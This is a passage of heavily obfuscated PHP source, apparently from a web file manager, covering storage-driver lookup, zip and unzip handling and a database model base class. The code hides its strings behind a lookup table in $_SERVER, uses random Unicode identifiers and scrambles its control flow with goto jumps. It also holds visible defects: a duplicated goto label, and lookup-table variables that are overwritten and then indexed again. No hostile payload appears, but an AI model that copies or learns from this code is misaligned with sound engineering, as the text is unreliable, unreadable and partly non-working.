KodIO::KOD_SOURCE: $DƇ = $a͌Ռ . $DƇ; $D憫ą = array($e͐έ[1065] => $e͐έ[1066], $e͐έ[6] => $b᲎); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $Aʨ = $GLOBALS[$e͐έ[1067]]; self::$driverListUser = array_to_keyvalue($Aʨ, $e͐έ[393]); } $D憫ą = self::$driverListUser[$a͌Ռ]; break; case KodIO::KOD_SHARE_LINK: $D憫ą = array($e͐έ[1065] => $e͐έ[1068], $e͐έ[6] => $b᲎); $F = Action($e͐έ[1069])->sharePathInfo($b᲎[$e͐έ[76]]); $DƇ = $F[$e͐έ[395]]; if (!$F[$e͐έ[395]]) { $eֻ = Model($e͐έ[563])->getInfo($F[$e͐έ[468]]); $DƇ = KodIO::clear($eֻ[$e͐έ[1070]] . $b᲎[$e͐έ[1063]]); $b᲎[$e͐έ[466]] = $eֻ; $b᲎[$e͐έ[1047]] = $DƇ; $D憫ą = array($e͐έ[1065] => $e͐έ[1071], $e͐έ[6] => $b᲎); } break; case KodIO::KOD_SHARE_ITEM: $D憫ą = array($e͐έ[1065] => $e͐έ[1072], $e͐έ[6] => $b᲎); $eֻ = Model($e͐έ[563])->getInfo($b᲎[$e͐έ[393]]); if ($eֻ[$e͐έ[395]] == $e͐έ[191]) { $DƇ = KodIO::clear($eֻ[$e͐έ[1070]] . $b᲎[$e͐έ[1063]]); $b᲎[$e͐έ[466]] = $eֻ; $b᲎[$e͐έ[1047]] = $DƇ; $D憫ą = array($e͐έ[1065] => $e͐έ[1073], $e͐έ[6] => $b᲎); } else { if (!$DƇ) { $DƇ = $eֻ[$e͐έ[395]]; } } break; default: $DƇ = $b᲎[$e͐έ[76]]; $D憫ą = array($e͐έ[1065] => $e͐έ[1074]); break; } $c = $b᲎[$e͐έ[76]]; if (!isset(self::$driverCache[$c])) { $ağȭ = strtolower($D憫ą[$e͐έ[94]]); $Cа = $GLOBALS[$e͐έ[6]][$e͐έ[88]][$e͐έ[794]]; $bø = $e͐έ[72] . (isset($Cа[$ağȭ]) ? $Cа[$ağȭ] : ucfirst($ağȭ)); if (!class_exists($bø)) { show_json("{$bø}\x20\156\157\x74\x20\145\x78\x69\163\x74\x73\x21", !1); } $FŴí = isset($D憫ą[$e͐έ[6]]) ? $D憫ą[$e͐έ[6]] : !1; self::$driverCache[$c] = new $bø($FŴí); } goto A; dǕ˘: $F¨->path = $DƇ; return $F¨; goto bŇ; eʹ: $e͐έ =& $_SERVER[̉]; $E挏 = $b᲎[$e͐έ[1064]]; $a͌Ռ = $b᲎[$e͐έ[393]]; goto e؃; A: $F¨ = self::$driverCache[$c]; $F¨->pathDriver = $E挏; $F¨->pathBase = $e͐έ[33]; goto C谯ʬ; C谯ʬ: if (isset($D憫ą[$e͐έ[6]][$e͐έ[1075]])) { $F¨->pathBase = rtrim($D憫ą[$e͐έ[6]][$e͐έ[1075]], $e͐έ[8]) . $e͐έ[8]; $DƇ = $F¨->pathBase . ltrim($DƇ, $e͐έ[8]); } $DƇ = $F¨->getPath($DƇ); if (isset($b᲎[$e͐έ[1047]])) { $DƇ = $b᲎[$e͐έ[1047]]; } goto dǕ˘; bŇ: } public static function errorTips($b˘ = false) { goto f頿; f頿: $D䍍ʼ =& $_SERVER[̉]; static $Fз = array(); $aᯩ = 1000; goto a; a: if ($b˘ === -1) { return $Fз ? $Fз[count($Fз) - 1] : $D䍍ʼ[33]; } if ($b˘ === !1) { return implode($D䍍ʼ[229], $Fз); } if (count($Fз) >= $aᯩ) { $Fз = array_slice($Fз, $aᯩ * 0.5, $aᯩ); } goto dЧׂ; dЧׂ: $Fз[] = $b˘; write_log($D䍍ʼ[160] . ACTION . $D䍍ʼ[1076] . $b˘, $D䍍ʼ[1077]); goto bҜ; bҜ: } public static function getLastError($aɍ = '') { $ḟӎ = self::errorTips(-1); return $ḟӎ ? $ḟӎ : $aɍ; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $b; if (!$b) { $D݇ޞ = IO::init($_SERVER[̉][8]); } return $D݇ޞ; } private static function iconvSystem($Cث) { return self::local()->iconvSystem($Cث); } private static function iconvApp($A餵) { return self::local()->iconvApp($A餵); } public static function zip($DД, $D莯 = "\x7a\151\160", $FǊڠ = '', $bş = REPEAT_RENAME) { goto E; d۷ԩ: $E = !1; if (!$FǊڠ && $fŋ->getType() == $eӹ[106]) { $B = self::zipFileList($DД); } else { $E = $FǊڠ ? $FǊڠ : TEMP_FILES . $eӹ[1078] . time() . rand_string(8) . $eӹ[8]; mk_dir($E); $B = self::zipFileList($DД, $E); } $f = $eߖܓ[$eӹ[28]]; goto aÑӔߙ; eǄ: if ($FǊڠ || !$E) { if ($E && strstr($E, TEMP_FILES)) { $D煩Ŋ = $B = array(); recursion_dir($b, $D煩Ŋ, $B, 0); foreach ($D煩Ŋ as $bĈ) { del_dir($bĈ); } foreach ($B as $c焎څ) { if ($c焎څ == $b͍) { continue; } del_file($c焎څ); } } return $eǷ; } $Dͧ = self::pathFather($eߖܓ[$eӹ[76]]); $bΧ = self::move($eǷ, $Dͧ, $bş); goto C; E: $eӹ =& $_SERVER[̉]; $fŋ = self::init($DД[0][$eӹ[76]]); $eߖܓ = self::info($DД[0][$eӹ[76]]); goto d۷ԩ; cǍ̐: foreach ($B as $a߄ => $d) { $B[$a߄] = self::iconvSystem($d); } KodArchive::create($b͍, $B); if (!IO::exist($eǷ)) { if ($E) { del_dir($E); } show_json(LNG($eӹ[1080]), !1); } goto eǄ; aÑӔߙ: if (count($B) > 1) { $a = IO::info(IO::pathFather($eߖܓ[$eӹ[76]])); $f = $a[$eӹ[28]]; } $b = $E; if (!$b) { $b = get_path_father($eߖܓ[$eӹ[76]]); if (!$FǊڠ && $fŋ->getType() == $eӹ[106]) { $b = get_path_father($fŋ->path); } $C = IO::info($b); if (!$C[$eӹ[196]]) { show_json(LNG($eӹ[1079]), !1); } } goto A; C: if (!$bΧ) { del_dir($E); show_json(LNG($eӹ[1080]), !1); } del_dir($E); return $bΧ; goto aØ; A: $eǷ = $b . $f . $eӹ[95] . $D莯; $eǷ = get_filename_auto($eǷ, $eӹ[33], $bş); $b͍ = self::iconvSystem($eǷ); goto cǍ̐; aØ: } public static function unzip($eŢՍ, $Bۓ = "\162\x65\160\x6c\141\143\145") { goto Fޯ; Ȩţ: if (!($bɇ = parent::info($a))) { show_json(LNG($eÄ[1082]), !1); } if (!($FƱ = parent::infoFull($a͟))) { $a͟ = parent::mkdir($a͟); $FƱ = array($eÄ[76] => $a͟); } else { if (isset($FƱ[$eÄ[395]]) && trim($FƱ[$eÄ[76]], $eÄ[8]) != trim($a͟, $eÄ[8])) { $Cٴ = KodIO::make($FƱ[$eÄ[478]]); $FҠ = parent::fileNameAuto($Cٴ, $FƱ[$eÄ[28]], REPEAT_RENAME_FOLDER, !0); $a͟ = parent::mkdir($Cٴ . $FҠ); $FƱ = array($eÄ[76] => $a͟); } } $a͟ = $FƱ[$eÄ[76]]; goto Fʎ; Fʎ: $F = self::tmpFileName($bɇ); $d΄ = TEMP_FILES . $F; del_dir($d΄); goto d܂; f: return !0; goto f踮; eƲս: if (!@file_exists(self::iconvSystem($fẋꇉ))) { $C󜎾톺 = self::localFilePath($a, $Dְ); $fẋꇉ = $C󜎾톺 ? $C󜎾톺 : parent::download($a, $fẋꇉ); } $fẋꇉ = self::iconvSystem($fẋꇉ); $e瑮 = isset($eŢՍ[$eÄ[1083]]) ? $eŢՍ[$eÄ[1083]] : $eÄ[1084]; goto C; B: foreach ($f̋ as $b璄) { $b璄 = self::iconvApp($b璄); self::move($b璄, $a͟, $Bۓ); } del_dir($d΄); if (!$C󜎾톺) { del_file($fẋꇉ); } goto f; aխ: Hook::trigger($eÄ[1088], $d΄); recursion_dir($d΄, $cε, $f, 0); $f̋ = array_merge($cε, $f); goto B; Fޯ: $eÄ =& $_SERVER[̉]; $a = $eŢՍ[$eÄ[76]]; $a͟ = $eŢՍ[$eÄ[1081]]; goto Ȩţ; d܂: mk_dir($d΄); $Dְ = self::fileExt($bɇ); $fẋꇉ = $d΄ . $eÄ[95] . $Dְ; goto eƲս; C: $C좕 = KodArchive::extract($fẋꇉ, $d΄ . $eÄ[8], $e瑮); self::archiveExt(); if (!$C좕[$eÄ[1085]]) { show_json($eÄ[1086] . $C좕[$eÄ[1087]], !1); } goto aխ; f踮: } public static function unzipList($c˄) { goto B; C؋: return $A˱[$a[1087]]; goto D׎؝; E̖ڪ: if (isset($cܲ)) { $a = array($cܲ[$a[76]], $cܲ[$a[1089]], $cܲ[$a[28]]); $ãƽ = md5(implode($a[71], $a)) . $a[95] . get_path_ext($cܲ[$a[28]]); } else { $a = array($E[$a[28]], $E[$a[76]], $E[$a[78]]); $ãƽ = md5(implode($a[71], $a)) . $a[95] . $fر; } if ($e == -1) { $b = IO_PATH_SYSTEM_TEMP . "\x7a\151\x70\x56\151\145\x77\57{$b鶏}\57{$ãƽ}\x2e\x6c\x6f\147"; $F҇¶ = self::infoFull($b); if ($F҇¶) { $b = $F҇¶[$a[76]]; $Aߠ = self::getContent($b); if ($Aߠ) { $Fߙ = json_decode($Aߠ, !0); if (count($Fߙ) >= $eŔ) { show_json(sprintf(LNG($a[1091]), count($Fߙ)), !1); } return $Fߙ; } } else { $b = self::mkfile($b); } } $A = TEMP_FILES . $b鶏; goto Bܣչ; Aݦ: $E = self::info($D); $fر = self::fileExt($E); $b鶏 = self::tmpFileName($E); goto E̖ڪ; Aㆦ: $eŔ = 50000; if (request_url_safe($d)) { $cܲ = parse_url_query($d); if (!isset($cܲ[$a[76]])) { show_json($a[1090], !1); } } $D = isset($cܲ) ? $cܲ[$a[76]] : $d; goto Aݦ; Bܣչ: if (!is_dir($A)) { mk_dir($A); } $B = $A . $a[8] . $ãƽ; if (!@file_exists(self::iconvSystem($B))) { if (isset($cܲ)) { url_request($d, $a[1092], $B); } else { $C = self::localFilePath($d, $fر); $B = $C ? $C : self::download($d, $B); } } goto E; B: $a =& $_SERVER[̉]; $d = $c˄[$a[76]]; $e = isset($c˄[$a[1089]]) ? $c˄[$a[1089]] : -1; goto Aㆦ; eᅔ酉: self::archiveExt(); del_dir($A); if (!$A˱[$a[1085]]) { show_json($A˱[$a[1087]], !1); } goto CʜЬ; CʜЬ: $Fߙ = json_encode($A˱[$a[1087]]); self::setContent($b, $Fߙ); if (count($A˱[$a[1087]]) >= $eŔ) { show_json(sprintf(LNG($a[1091]), count($A˱[$a[1087]])), !1); } goto C؋; E: $B = self::iconvSystem($B); if ($e >= 0) { $DɅ = isset($c˄[$a[1093]]) ? $c˄[$a[1093]] : !1; $Cα = isset($c˄[$a[28]]) ? $c˄[$a[28]] : $a[33]; KodArchive::filePreview($B, $e, $DɅ, $Cα); self::archiveExt(); die; } $A˱ = KodArchive::listContent($B); goto eᅔ酉; D׎؝: } private static function fileExt($bة) { $dҏ =& $_SERVER[̉]; $fݹ = $bة[$dҏ[168]]; if ($fݹ == $dҏ[1094]) { $F񜌐 = $dҏ[1095]; if (substr($bة[$dҏ[28]], -strlen($F񜌐)) == $F񜌐) { $fݹ = $dҏ[1096]; } } self::archiveExt($fݹ); return $fݹ; } private static function zipFileList($A쓾, $d䩦Û = false) { $dӻ =& $_SERVER[̉]; $Dɹ = array(); foreach ($A쓾 as $A堓) { $eԿ = $A堓[$dӻ[76]]; if ($d䩦Û) { $eԿ = self::copy($A堓[$dӻ[76]], $d䩦Û, $dӻ[786]); } else { $Dʯ = self::init($A堓[$dӻ[76]]); if ($Dʯ->getType() == $dӻ[106]) { $eԿ = $Dʯ->path; } } if ($eԿ && self::local()->exist($eԿ)) { $Dɹ[$A堓[$dӻ[76]]] = $eԿ; } } if (!empty($Dɹ)) { return array_values($Dɹ); } show_json(LNG($dӻ[1060]), !1); } public static function tmpFileName($e량) { $Aʤ݈ =& $_SERVER[̉]; $B = array($e량[$Aʤ݈[28]], $e량[$Aʤ݈[76]], $e량[$Aʤ݈[78]], $e량[$Aʤ݈[487]]); return md5(implode($Aʤ݈[71], $B)); } private static function localFilePath($Eᓎî, $bܞ) { goto f; AÊ: if ($A̋[$Eׇʣ[29]] == KodIO::KOD_SOURCE) { $A = Model($Eׇʣ[793])->fileInfoGet(KodIO::sourceID($Eᓎî)); if (!$A[$Eׇʣ[76]]) { show_json($Eׇʣ[1099], !1); } $Eᓎî = $A[$Eׇʣ[76]]; } $e = self::init($Eᓎî); $fǷń = $e->getType(); goto c۷; c۷: if ($fǷń == $Eׇʣ[106] || $fǷń == $Eׇʣ[1100]) { if (!$e->exist($e->path)) { show_json(LNG($Eׇʣ[105]), !1); } return $e->path; } return !1; goto fۏأ; f: $Eׇʣ =& $_SERVER[̉]; if ($bܞ == $Eׇʣ[1097] && strtoupper(substr(PHP_OS, 0, 3)) == $Eׇʣ[1098]) { return !1; } $A̋ = KodIO::parse($Eᓎî); goto AÊ; fۏأ: } private static function archiveExt($e߱ן = '') { $GLOBALS[$_SERVER[̉][1101]] = $e߱ן; } } goto F; c: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\x54\151\155\145", "\164\151\155\x65", "\x69\x6e\x73\x65\x72\164\x2c\x75\x70\144\141\164\x65", "\146\165\x6e\x63\164\151\x6f\156"), array("\143\x72\x65\x61\x74\x65\x54\151\155\145", "\164\151\155\x65", "\151\156\x73\145\x72\164", "\146\165\156\143\164\x69\x6f\x6e")); public function setDataAuto($cԗ) { $this->dataAuto = $cԗ; } public function __construct($Bƽ = '', $F墺 = '', $E = '') { parent::__construct($Bƽ, $F墺, $E); } public static function textEncode($b߄ҝ) { if (!$b߄ҝ) { return $b߄ҝ; } $e߈ = json_encode($b߄ҝ); $e߈ = preg_replace_callback($_SERVER[̉][353], function ($A܏݊) { return addslashes($A܏݊[0]); }, $e߈); return json_decode($e߈); } public static function textDecode($aղ) { $E =& $_SERVER[̉]; $b = json_encode($aղ); $b = preg_replace_callback($E[354], function ($Bđ) { return $_SERVER[̉][97]; }, $b); return json_decode($b); } protected $tableMeta = array(); protected function _beforeInsert(&$d, $Cω) { $b܅ =& $_SERVER[̉]; if (!$this->checkDataAutoHas($b܅[355])) { return; } $this->dataBeforeFilter($d, $b܅[355]); } protected function _beforeUpdate(&$eöڑ, $e´) { $d̆ =& $_SERVER[̉]; if (!$this->checkDataAutoHas($d̆[356])) { return; } $this->dataBeforeFilter($eöڑ, $d̆[356]); } protected function _afterSelect(&$F͒, $a黐) { if (!is_array($F͒)) { return; } if (!$this->checkDataAutoHas($_SERVER[̉][357])) { return; } foreach ($F͒ as &$f) { $this->dataAfterFilter($f); } unset($f); } protected function _afterFind(&$bׇ, $f˒) { if (!is_array($bׇ)) { return; } if (!$this->checkDataAutoHas($_SERVER[̉][357])) { return; } $this->dataAfterFilter($bׇ); } public function setAutoIncrement($d) { $D임 = array($this->getPk() => $d); $B̑߰ = $this->data($D임)->add(); if ($B̑߰) { $this->delete($B̑߰); } } public function getAutoIncrement() { $d = $this->getTableName(); $A鍥 = $this->max($this->getPk()); $F깞 = $this->query("\163\150\x6f\167\x20\164\x61\x62\x6c\145\40\x73\x74\141\164\x75\x73\x20\167\150\x65\162\x65\40\116\x61\155\x65\x3d\47{$d}\x27"); $F = $F깞[0][$_SERVER[̉][358]]; $Fڵ = max($A鍥, $F); return $Fڵ; } protected function _callBefore($cȓњ, $Bѕ➠) { return $this->cacheCallCheck($cȓњ, $Bѕ➠, !1); } protected function _callAfter($AϿ, $A) { return $this->cacheCallCheck($AϿ, $A, !0); } protected function cacheFunctionAlias($FԘޛ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($CҤ, $c̃, $Eƻͩ = false) { $BӉ⫐ = $this->cacheFunctionAlias($c̃); if (!$BӉ⫐) { return; } foreach ($BӉ⫐ as $A֝ԩС => $bſ) { $cЏ = $bſ[0]; $B = explode($_SERVER[̉][47], $bſ[1]); if ($CҤ == $A֝ԩС) { return $this->cacheFunctionGet($A֝ԩС, $cЏ); } if ($Eƻͩ && in_array($CҤ, $B)) { $this->cacheFunctionClear($A֝ԩС, $cЏ); } } } public function cacheFunctionGet($E, $f) { $fӖ = $this->cacheKeyMake($E, $f); $cқ͟Ӹ = Cache::get($fӖ); if (!is_array($cқ͟Ӹ)) { $cқ͟Ӹ = call_user_func_array(array($this, $E), array($f, !0)); Cache::set($fӖ, $cқ͟Ӹ); } return $cқ͟Ӹ; } public function cacheFunctionClear($b, $F琿) { $EÒ = $F琿; if (!is_array($F琿)) { $EÒ = array($F琿); } foreach ($EÒ as $dǊÕ) { $F = $this->cacheKeyMake($b, $dǊÕ); Cache::remove($F); } } private function cacheKeyMake($eܤ, $e) { $Cɥಈ =& $_SERVER[̉]; return get_class($this) . $Cɥಈ[71] . $eܤ . $Cɥಈ[359] . $e; } protected function selectPageReset() { $a =& $_SERVER[̉]; if (isset($GLOBALS[$a[360]])) { return; } $GLOBALS[$a[360]] = isset($GLOBALS[$a[7]][$a[361]]) ? $GLOBALS[$a[7]][$a[361]] : !1; $GLOBALS[$a[362]] = isset($GLOBALS[$a[7]][$a[351]]) ? $GLOBALS[$a[7]][$a[351]] : !1; $GLOBALS[$a[7]][$a[361]] = !1; $GLOBALS[$a[7]][$a[351]] = !1; } protected function selectPageRestore() { $e =& $_SERVER[̉]; if (!isset($GLOBALS[$e[360]])) { return; } $GLOBALS[$e[7]][$e[361]] = $GLOBALS[$e[360]]; $GLOBALS[$e[7]][$e[351]] = $GLOBALS[$e[362]]; unset($GLOBALS[$e[360]]); unset($GLOBALS[$e[362]]); } protected function selectPage($b܆ = 200, $B = 1) { goto b՟; c: $fв = array(); $DХ = 1; if ($B == 1 && $DХ) { $this->optionsValue($cШԮ); $fв = $this->page($B, $b܆)->select(); $fʐ׼ = is_array($fв) ? count($fв) : 0; if ($fʐ׼ < $b܆) { $e = 1; } else { $this->optionsValue($bЅ); $fʐ׼ = intval($this->count()); $e = ceil($fʐ׼ / $b܆); } } else { $this->optionsValue($bЅ); $fʐ׼ = intval($this->count()); $e = ceil($fʐ׼ / $b܆); $B = $B >= $e ? $e : $B; $this->optionsValue($cШԮ); $fв = $this->page($B, $b܆)->select(); } goto Bę; Bę: if (!is_array($fв)) { $fв = array(); } if ($e == 1) { $fʐ׼ = count($fв); } $a䢇 = array($B[364] => array($B[365] => $fʐ׼, $B[361] => $b܆, $B[351] => $B, $B[366] => $e), $B[367] => $fв); goto d; b՟: $B =& $_SERVER[̉]; global $in; $cШԮ = $this->optionsValue(); goto fɥߏ; fɥߏ: $Eߑƈ = 50000; $b܆ = isset($in[$B[361]]) && $in[$B[361]] ? $in[$B[361]] : $b܆; if ($b܆ === -1) { $in[$B[361]] = !1; $Eߑƈ = 100000000; $b܆ = $Eߑƈ; } goto C«; C«: $bЅ = $cШԮ; $bЅ[$B[363]] = array(); $b܆ = intval($b܆); goto a; a: $b܆ = $b܆ <= 5 ? 5 : ($b܆ >= $Eߑƈ ? $Eߑƈ : $b܆); $B = intval(isset($in[$B[351]]) && $in[$B[351]] ? $in[$B[351]] : $B); $B = $B <= 1 ? 1 : $B; goto c; d: return $a䢇; goto C׫; C׫: } protected function checkLength($Aޘ, $Fޥ = 0, $D = '') { $e =& $_SERVER[̉]; $Fޥ = $Fޥ ? $Fޥ : 65536; if (!$Aޘ || strlen($Aޘ) < $Fޥ) { return; } $D = $D ? $D . $e[68] : $e[33]; show_json($D . LNG($e[368]) . "\x28{$Fޥ}\x29", !1); } protected function metaSet($D҂, $Ē = null, $Bǂ = null) { goto Cզˊ; Fλ: if (is_null($Ē)) { return $f؉Ǥ->where(array($Eₔ => $D҂))->delete(); } if (is_null($Bǂ) && is_string($Ē)) { return $f؉Ǥ->where($a؎)->delete(); } $AЊ = is_array($Ē) ? $Ē : array(); goto Fռ; Fռ: if (is_string($Ē)) { $AЊ[$Ē] = $Bǂ; } $cՋ = array(); foreach ($AЊ as $A僳 => $bӱ) { $this->checkLength($bӱ, !1, $d¡Ɍ . $D߰[4] . $A僳); $cՋ[] = array($Eₔ => $D҂, $D߰[93] => $A僳, $D߰[372] => $bӱ); } goto aƃ; aƃ: $Aޖ = $D߰[373] . $this->tableMeta; CacheLock::lock($Aޖ); $f؉Ǥ->where(array($Eₔ => $D҂))->addAll($cՋ, array(), !0); goto bα; bα: CacheLock::unlock($Aޖ); return !0; goto b; B̶Ԣ: $d¡Ɍ = $this->tableMeta[$D߰[370]]; $f؉Ǥ = Model($d¡Ɍ); $a؎ = array($Eₔ => $D҂, $D߰[371] => $Ē); goto Fλ; Cզˊ: $D߰ =& $_SERVER[̉]; if (!$this->tableMeta || !$D҂) { return !1; } $Eₔ = $this->tableMeta[$D߰[369]]; goto B̶Ԣ; b: } public function metaGet($F⊹, $b⣗ = false) { goto B棯; B棯: $E =& $_SERVER[̉]; if (!$this->tableMeta) { return array(); } $dߵ = $this->tableMeta[$E[369]]; goto A; A: $BȌ = Model($this->tableMeta[$E[370]]); if ($b⣗) { $aߟՠ = array($dߵ => $F⊹, $E[93] => $b⣗); return $BȌ->where($aߟՠ)->getField($E[372]); } $aߟՠ = array($dߵ => $F⊹); goto dӬ; dӬ: $fҠƂ = $BȌ->field($E[374])->where($aߟՠ)->select(); $fҠƂ = array_to_keyvalue($fҠƂ, $E[93], $E[372]); return $fҠƂ; goto A; A: } private function checkDataAutoHas($dӃ⑞) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $d랽) { if (in_array($dӃ⑞, explode($_SERVER[̉][47], $d랽[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$D㏶, $BȐ) { $a¸ =& $_SERVER[̉]; foreach ($this->dataAuto as $F) { $eʠȷ = $F[0]; if (!in_array($BȐ, explode($a¸[47], $F[2]))) { continue; } switch (trim($F[3])) { case $a¸[319]: case $a¸[320]: $dϕ = $F[1]; $BټՕ = isset($F[4]) ? (array) $F[4] : array(); if ($dϕ == $a¸[197] && array_key_exists($eʠȷ, $D㏶)) { if (!$D㏶[$eʠȷ]) { unset($D㏶[$eʠȷ]); } break; } if (isset($D㏶[$eʠȷ])) { array_unshift($BټՕ, $D㏶[$eʠȷ]); } if ($a¸[319] == $F[3]) { $D㏶[$eʠȷ] = call_user_func_array($dϕ, $BټՕ); } else { $D㏶[$eʠȷ] = call_user_func_array(array(&$this, $dϕ), $BټՕ); } break; case $a¸[271]: $D㏶[$eʠȷ] = $D㏶[$F[1]]; break; case $a¸[292]: if (isset($D㏶[$eʠȷ]) && !is_string($D㏶[$eʠȷ])) { $D㏶[$eʠȷ] = json_encode_force($D㏶[$eʠȷ]); } break; case $a¸[321]: if ($D㏶[$eʠȷ] === $a¸[33]) { unset($D㏶[$eʠȷ]); } break; case $a¸[322]: $D㏶[$eʠȷ] = $F[1]; default: break; } } if ($BȐ == $a¸[355]) { $E巊 = strtolower($this->db->getDbType()); if (strpos($E巊, $a¸[9]) !== 0) { return; } $F輸 = $this->field(!0)->fields; $a鐩 = $F輸[$a¸[250]]; if (isset($F輸[$a¸[249]])) { unset($a鐩[$F輸[$a¸[249]]]); } foreach ($a鐩 as $fϚ => $BȐ) { if (!isset($D㏶[$fϚ])) { $D㏶[$fϚ] = $a¸[33]; } } } } private function dataAfterFilter(&$b) { $dÛ =& $_SERVER[̉]; foreach ($this->dataAuto as $A⒆) { $BЛ = $A⒆[0]; if (!in_array($dÛ[357], explode($dÛ[47], $A⒆[2]))) { continue; } if (!isset($b[$BЛ])) { continue; } switch (trim($A⒆[3])) { case $dÛ[319]: case $dÛ[320]: $bʱ = isset($A⒆[4]) ? (array) $A⒆[4] : array(); array_unshift($bʱ, $b[$BЛ]); if ($dÛ[319] == $A⒆[3]) { $b[$BЛ] = call_user_func_array($A⒆[1], $bʱ); } else { $b[$BЛ] = call_user_func_array(array(&$this, $A⒆[1]), $bʱ); } break; case $dÛ[271]: $b[$BЛ] = $b[$A⒆[1]]; break; case $dÛ[292]: $e؈鷅 = $b[$BЛ]; $b[$BЛ] = json_decode($e؈鷅, !0); if (is_null($b[$BЛ])) { $b[$BЛ] = $e؈鷅; } break; case $dÛ[321]: if ($b[$BЛ] === $dÛ[33]) { unset($b[$BЛ]); } break; case $dÛ[322]: $b[$BЛ] = $A⒆[1]; default: break; } } } public function saveAll($cα) { goto Dϡ; B: $this->chunkEventSet(); goto a; C쵂: $A΍߈ = array(); $DΌ® = count($cα); for ($A贖 = 0; $A贖 < $DΌ®; $A贖++) { $D = $cα[$A贖]; if (!is_array($D) || count($D) != 4) { continue; } $eں = "\x55\120\104\x41\124\x45\40\140{$b}\x60\40\123\105\x54\x20{$D[2]}\x20\x3d\40\x43\x41\x53\x45\40{$D[0]}\x20\12"; if ($cᎆ == 0) { $f = $eں; } $A΍߈[] = $FǓ[116] . $D[1] . $FǓ[116]; $cᎆ++; $f .= "\40\x57\x48\x45\116\40\x27{$D[1]}\x27\40\x54\x48\x45\116\40\x27{$D[3]}\x27\40\xa"; if ($cᎆ == $c || $A贖 == $DΌ® - 1) { goto a; cŃ: $A΍߈ = array(); goto BП㴏; a: $E鮩 = implode($FǓ[47], $A΍߈); $f .= "\x20\105\116\x44\40\x20\x57\x48\105\122\x45\40{$D[0]}\40\111\x4e\x20\50{$E鮩}\51\x20"; $this->execute($f); goto bÒ; bÒ: $cᎆ = 0; $f = $eں; $this->chunkEventCheck(count($A΍߈)); goto cŃ; BП㴏: } } goto B; Dϡ: $FǓ =& $_SERVER[̉]; $b = $this->tablePrefix . $this->tableName; $c = self::SQL_WHERE_IN_CHUNK; goto F; F: $cα = is_array($cα) ? $cα : array(); $f = $FǓ[375]; $cᎆ = 0; goto C쵂; a: } public function saveAllEach($eт) { $A =& $_SERVER[̉]; $B⤈ = $this->tablePrefix . $this->tableName; foreach ($eт as $d◃) { if (!is_array($d◃) || count($d◃) != 4) { continue; } $d = $d◃[0] . $A[376] . $d◃[1] . $A[116]; $c = $d◃[2] . $A[376] . $d◃[3] . $A[116]; $cȠ = "\x75\160\x64\141\x74\x65\40{$B⤈}\40\163\x65\164\x20{$c}\x20\x77\150\x65\162\x65\x20{$d}\73"; $this->execute($cȠ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($e = false, $Fޠ = false) { $this->_chunkEvent = $e; $this->_chunkEventParam = $Fޠ; } private function chunkEventCheck($dĤȦ݋) { if (!$this->_chunkEvent) { return; } $b = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $b[$_SERVER[̉][377]] = $dĤȦ݋; Hook::trigger($this->_chunkEvent, $b); } public function addAll($d݆, $Aڳ퐰 = array(), $bԳ = false) { goto A; A: $EѺػַ =& $_SERVER[̉]; ignore_timeout(); $e = self::SQL_WHERE_IN_CHUNK; goto fК; dô: if (method_exists($this->db, $EѺػַ[270])) { for ($b = 0; $b < count($d݆); $b += $e) { $cḸ = array_slice($d݆, $b, $e); if (!is_array($cḸ) || count($cḸ) == 0) { break; } $AÖ = $this->db->insertAll($cḸ, $Aڳ퐰, $bԳ); $this->chunkEventCheck(count($cḸ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($d݆ as $EՕ => $C) { $AÖ = $this->db->insert($C, $Aڳ퐰, $bԳ); } $this->commit(); } if (!1 !== $AÖ) { $BԎ橊 = $this->getLastInsID(); if ($BԎ橊) { return $BԎ橊; } } return $AÖ; goto Dʾ; fК: if (empty($d݆)) { $this->error = think_lang($EѺػַ[269]); return !1; } $Aڳ퐰 = $this->_parseOptions($Aڳ퐰); foreach ($d݆ as $EՕ => $C) { $d݆[$EՕ] = $this->_facade($C); $this->_beforeInsert($d݆[$EՕ], $Aڳ퐰); } goto dô; Dʾ: } public function save($Fׇ = '', $Bҭ膔 = array()) { goto E޳揧; E޳揧: $a¬嘵 =& $_SERVER[̉]; $F = self::SQL_WHERE_IN_CHUNK; $eѨ = $this->optionsValue(); goto e璯; e璯: $e = $this->findWhereField($eѨ); if (!$e) { return parent::save($Fׇ, $Bҭ膔); } $bډ = 0; goto dѠՆ; dѠՆ: $f㿎 = $eѨ[$a¬嘵[273]][$e][1]; $f㿎 = is_array($f㿎) ? $f㿎 : array(); $eɃ = count($f㿎); goto C; C: for ($e = 0; $e < $eɃ; $e += $F) { $D = array_slice($f㿎, $e, $F); if (!is_array($D) || count($D) == 0) { break; } $eѨ[$a¬嘵[273]][$e][1] = $D; $this->optionsValue($eѨ); $bډ += parent::save($Fׇ, $Bҭ膔); $this->chunkEventCheck(count($D)); } $this->chunkEventSet(); return $bډ; goto Fƙ΃; Fƙ΃: } public function add($c΄̊ = '', $E͋ = array(), $A𳯂 = false) { if ($this->addTaskStatus && is_array($c΄̊)) { $this->addTaskData[] = $c΄̊; return; } return parent::add($c΄̊, $E͋, $A𳯂); } public function parseWhereLike($b⯏, $FԉȄ = '', $Cܵ = false, &$f = false) { goto B; e̝墊: if (!is_array($b⯏)) { return $b⯏; } $AЦܬ = array(); $eڮ铭 = 0; goto a; a: foreach ($b⯏ as $dܶ즏 => $Bէ) { if (is_array($Bէ) && count($Bէ) == 2 && $Bէ[0] == $D[380] && is_string($Bէ[1]) && substr($Bէ[1], 0, 1) == $D[381] && substr($Bէ[1], strlen($Bէ[1]) - 1, 1) == $D[381]) { goto b͹; F: continue; goto bͬ; b͹: $f = !0; $d∺ = is_string($dܶ즏) ? $dܶ즏 : $FԉȄ; $b = substr($Bէ[1], 1, strlen($Bէ[1]) - 2); goto E; E: $b = $this->db->escapeString($b); if (!strpos($d∺, $D[95])) { $d∺ = $D[382] . $d∺ . $D[382]; } $Dڮέפ = $D[182] . $b . $D[182]; goto aȎ; aȎ: if ($a睰ͮ[$D[383]]) { 